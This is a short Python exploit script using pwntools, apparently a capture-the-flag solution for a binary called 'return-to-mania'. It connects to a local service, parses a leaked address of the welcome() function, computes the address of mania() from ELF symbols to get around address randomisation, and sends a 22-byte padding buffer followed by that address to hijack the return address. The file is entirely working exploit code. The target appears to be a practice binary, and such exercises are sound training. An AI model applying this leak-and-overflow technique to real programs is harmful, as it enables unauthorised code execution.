#!/usr/bin/env python

from pwn import *

DEBUG = 0

context.log_level = "debug" if DEBUG else "warn"

exe = ELF("return-to-mania")
context(binary=exe)

r = remote("localhost", 3000)
# r = exe.process()

r.recvuntil("addr of welcome(): ")
leak = r.recvline().strip()
welcome_addr = int(leak, 16)

# leak grabs addr of welcome
info("welcome_addr: 0x%x" % welcome_addr)

mania_addr = welcome_addr - exe.symbols["welcome"] + exe.symbols["mania"]
info("mania_addr: 0x%x" % mania_addr)

payload = "A" * 22 + p32(mania_addr)

r.sendline(payload)
r.recvuntil("WELCOME TO THE RING!\n")

print(r.recvline())
